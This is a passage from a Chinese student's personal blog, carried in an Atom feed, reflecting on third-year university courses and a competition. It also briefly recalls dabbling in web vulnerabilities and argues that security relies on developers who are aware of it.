&lt;p&gt;软件架构主要讲一些架构风格、设计模式、企业应用模式（martin flower的那本）、以及大数据专题讲座。总之个人感觉是跟上面那门串着讲的，我写作业也是串着的。都是一个老师的嘛。&lt;/p&gt;
&lt;p&gt;数据挖掘，不多说了，新技能get。大作业是比赛。&lt;/p&gt;
&lt;p&gt;企业信息系统综合设计，上课讲的还是工作流，作业没啥关系，就是三次大作业，其中一次要用到数据挖掘的东西。也不考试，真是业界良心。&lt;/p&gt;
&lt;p&gt;小学期如愿以偿得报名了比赛，在简历上终于有比赛经历了。不过看着出去实习的租房子住，我还是住又破又烂的宿舍，心里好不爽。本来选了“服务器开光与驱魔导论”，后来给退了，通识课大三一年都修完了。&lt;/p&gt;
&lt;p&gt;另外大二暑假我还研究过一段时间的web漏洞，不算是研究吧，只是重新玩玩。后来感觉拿不到什么像样的shell了，找到的资料都过时了。互联网这个东西迭代很快，框架什么的层出不穷，一些老的洞，比如xss和sqlinj，都由于框架和良好的编程意识而销声匿迹了。其实互联网越来越健壮，还是值得欣慰的，以前你随便找个页面，在输入框输入和后尖括号，整个页面就变形了。&lt;/p&gt;
&lt;p&gt;后来听到这样一种说法。假设一个互联网应用的满分是一百分，很多应用刚编写出来是20分。由于绝对安全不可能达到，那么我们的目标是做到80分。这些20分的应用都存在着已知问题，但如果拥有一大堆成本上可行解决办法，就能提高到80分。安全不仅仅需要研究员，还需要大量拥有安全意识的开发者，前者只能提供初始的20分，但后者可以把20分拉到80分。但如果开发者没有安全意识，就永远还是20分。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;后来，我才想通了，慢慢来比较快。种一棵树最好的时机是十年前，其次是现在。&lt;/p&gt;
&lt;p&gt;大三上学期过得也不顺。本来想着课少了可以多休息休息，没想到十月份胃突然就难受了，而且是一直难受。很长一段时间，都是吃不好也睡不好。于是大三的整个一年我都没做多少私事，也就是搜索和整理资料，以及做电子书。
    
    </summary>
    
      <category term="杂记" scheme="http://www.flygon.net/categories/%E6%9D%82%E8%AE%B0/"/>
    
    
  </entry>
  
</feed>
